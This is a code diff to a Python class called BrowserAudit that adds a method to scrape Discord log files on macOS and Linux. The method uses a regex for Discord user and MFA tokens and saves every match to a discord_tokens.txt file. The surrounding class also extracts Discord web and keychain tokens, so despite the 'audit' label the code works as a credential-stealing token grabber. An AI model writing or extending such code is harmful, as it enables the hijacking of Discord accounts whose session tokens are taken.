@@ -348,6 +348,44 @@ class BrowserAudit:
         else:
             print(f"{self.COLORS['YELLOW']}[!] No Discord tokens found (try: sudo ./dist/audit-macos){self.COLORS['RESET']}\n")
 
+    def extract_discord_logs_tokens(self):
+        import glob
+        import re
+
+        print(f"{self.COLORS['CYAN']}[*] Extracting tokens from Discord logs...{self.COLORS['RESET']}")
+
+        if self.os_type == 'darwin':
+            log_dir = self.home / "Library/Application Support/discord/logs"
+        else:
+            log_dir = self.home / ".config/discord/logs"
+
+        if not log_dir.exists():
+            return
+
+        token_pattern = r'[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{27,}|mfa\.[a-zA-Z0-9_\-]{84,}'
+        found_any = False
+
+        try:
+            log_files = glob.glob(f"{log_dir}/*.log")
+            for log_file in log_files:
+                try:
+                    with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
+                        tokens = re.findall(token_pattern, content)
+
+                        if tokens and self.cookies_dir:
+                            with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
+                                for token in set(tokens):
+                                    out.write(f"[Discord-Log] {token}\n")
+                                    found_any = True
+                except:
+                    pass
+
+            if found_any:
+                print(f"{self.COLORS['GREEN']}[OK] Discord log tokens extracted{self.COLORS['RESET']}\n")
+        except Exception as e:
+            self.log("ERROR", f"Discord log extraction failed: {e}")
+
     def filter_display_content(self, content, filename):
         if 'discord_tokens' in filename or 'discord_web' in filename:
             return content
@@ -428,6 +466,7 @@ class BrowserAudit:
         self.extract_discord_web_tokens()
         self.extract_keychain_tokens()
         self.extract_discord_tokens()
+        self.extract_discord_logs_tokens()
 
         self.display_results()
 
